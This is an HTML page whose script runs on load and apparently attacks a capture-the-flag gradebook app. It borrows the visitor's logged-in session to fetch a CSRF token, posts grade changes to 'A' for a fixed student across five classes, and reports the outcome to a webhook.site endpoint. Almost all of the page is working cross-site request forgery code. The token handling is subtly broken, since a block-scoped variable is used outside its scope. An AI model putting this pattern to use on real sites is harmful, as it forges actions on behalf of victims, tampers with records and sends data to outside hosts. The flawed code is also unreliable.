<!DOCTYPE html>
<html>
<head>
    <title>Grade Update Portal</title>
</head>
<body>
    <h2>Administrative Grade Update in Progress...</h2>
    <div id="debug" style="white-space: pre-wrap; font-family: monospace; background: #f0f0f0; padding: 10px;"></div>
    
    <script>
    // Debug output
    const debugEl = document.getElementById('debug');
    function log(message) {
        debugEl.textContent += message + '\n';
        console.log(message);
    }

    // YOUR INFORMATION
    const YOUR_STUDENT_ID = 'cec61aee-395d-4281-af96-cfe05bda466e';
    const YOUR_CLASS_IDS = [
        'e522382b-7643-469c-ae52-ba488f5752c6',
        '5042bbaa-aae3-4bab-b841-2e7beb30c847',
        '8938a046-e7c5-4402-84b7-36980f2eede6',
        'abf7c048-cc3a-4797-9445-57e8cb725e71',
        '19481783-157e-45e1-8592-77efd688144a'
    ];

    async function changeGrades() {
        try {
            log('=== STARTING GRADE CHANGE PROCESS ===');
            log(`Target: https://gradebook-app.ctf.csaw.io/grade-change`);
            log(`Student ID: ${YOUR_STUDENT_ID}`);
            
            // 1. First get the CSRF token from the grade-change page
            log('\n[1] Fetching CSRF token from /grade-change...');
            const response = await fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
                credentials: 'include',
                headers: {
                    'Cache-Control': 'no-cache'
                }
            });
            
            log(`Response Status: ${response.status} ${response.statusText}`);
            
            if (!response.ok) {
                throw new Error(`Failed to fetch grade-change page: ${response.status}`);
            }
            
            const html = await response.text();
            log(`Response Length: ${html.length} characters`);
            
            // Extract CSRF token from the HTML
            log('\n[2] Extracting CSRF token...');
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, 'text/html');
            const csrfInput = doc.querySelector('input[name="csrf_token"]');
            
            if (!csrfInput) {
                // Try alternative selectors
                const metaToken = doc.querySelector('meta[name="csrf-token"]');
                if (metaToken) {
                    csrfToken = metaToken.getAttribute('content');
                    log(`✓ Found CSRF token in meta tag: ${csrfToken}`);
                } else {
                    throw new Error('CSRF token not found in page');
                }
            } else {
                const csrfToken = csrfInput.value;
                log(`✓ Found CSRF token: ${csrfToken}`);
            }
            
            if (!csrfToken) {
                throw new Error('CSRF token not found');
            }
            
            // 2. Change grades for each class
            log('\n[3] Changing grades...');
            let successCount = 0;
            
            for (const classId of YOUR_CLASS_IDS) {
                log(`\nChanging grade for class: ${classId}`);
                
                const formData = new FormData();
                formData.append('student_id', YOUR_STUDENT_ID);
                formData.append('class_id', classId);
                formData.append('grade', 'A');
                formData.append('csrf_token', csrfToken);
                
                const changeResponse = await fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
                    method: 'POST',
                    body: formData,
                    credentials: 'include',
                    headers: {
                        'Referer': 'https://gradebook-app.ctf.csaw.io/grade-change'
                    }
                });
                
                const resultText = await changeResponse.text();
                log(`Response: ${changeResponse.status} - ${resultText.substring(0, 100)}`);
                
                if (changeResponse.ok) {
                    successCount++;
                    log('✓ Success!');
                }
                
                await new Promise(resolve => setTimeout(resolve, 500));
            }
            
            // 3. Send confirmation to webhook
            log('\n[4] Sending results to webhook...');
            await fetch('https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb', {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    student_id: YOUR_STUDENT_ID,
                    success_count: successCount,
                    total_classes: YOUR_CLASS_IDS.length,
                    timestamp: new Date().toISOString(),
                    status: 'completed'
                })
            });
            
            log(`\n=== COMPLETED ===`);
            log(`Changed ${successCount}/${YOUR_CLASS_IDS.length} grades to A`);
            
        } catch (error) {
            log(`\n=== ERROR ===`);
            log(`Error: ${error.message}`);
            
            // Send error to webhook
            await fetch('https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb', {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    error: error.message,
                    timestamp: new Date().toISOString(),
                    status: 'error'
                })
            });
        }
    }

    // Execute when page loads
    log('Page loaded. Starting in 2 seconds...');
    setTimeout(changeGrades, 2000);
    </script>
</body>
</html>
